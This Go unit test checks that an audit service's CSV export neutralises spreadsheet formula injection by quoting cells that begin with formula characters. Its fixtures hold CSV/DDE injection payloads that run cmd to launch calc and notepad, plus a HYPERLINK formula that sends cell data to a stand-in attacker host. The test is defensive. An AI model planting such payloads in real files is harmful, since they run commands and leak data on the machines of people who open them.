package handler

import (
	"testing"
	"time"

	"github.com/aieera/sedoc/services/audit/internal/model"
)

// L-7: a CSV cell that starts with = + - @ TAB or CR is evaluated as a
// formula by Excel/Sheets/LibreOffice. Titles and user agents are
// attacker-controlled, so an exported audit log could execute
// =HYPERLINK(...) / DDE payloads on the auditor's machine. Every such
// cell must be prefixed with a single quote so it is read as text.
func TestAuditCSV_FormulaNeutralised(t *testing.T) {
	e := &model.AuditEvent{
		ID:            "0190f0aa-0000-7000-8000-000000000001",
		CreatedAt:     time.Date(2026, 10, 12, 9, 0, 0, 0, time.UTC),
		Actor:         "@SUM(1+1)*cmd|' /C calc'!A0",
		ActorName:     "-2+3",
		Action:        "document.viewed",
		ResourceType:  "document",
		ResourceID:    "0190f0aa-0000-7000-8000-000000000002",
		ResourceTitle: `=HYPERLINK("http://evil.example/?x="&A1,"click")`,
		IPAddress:     "203.0.113.9",
		UserAgent:     "+cmd|' /C notepad'!A0",
		PreviousHash:  "v2:abc",
		EventHash:     "v2:def",
		SourceEvent:   "\tdms.document.viewed.v1",
	}
	row := csvRow(e)
	want := map[int]string{
		2:  "'@SUM(1+1)*cmd|' /C calc'!A0",
		3:  "'-2+3",
		7:  `'=HYPERLINK("http://evil.example/?x="&A1,"click")`,
		9:  "'+cmd|' /C notepad'!A0",
		12: "'\tdms.document.viewed.v1",
	}
	for i, w := range want {
		if row[i] != w {
			t.Errorf("cell %d = %q, want %q", i, row[i], w)
		}
	}
	// Benign cells are untouched.
	if row[4] != "document.viewed" || row[8] != "203.0.113.9" || row[0] != e.ID {
		t.Errorf("benign cells changed: %q", row)
	}
	if got := neutraliseCSVCell("\rboom"); got != "'\rboom" {
		t.Errorf("CR-prefixed cell = %q", got)
	}
}
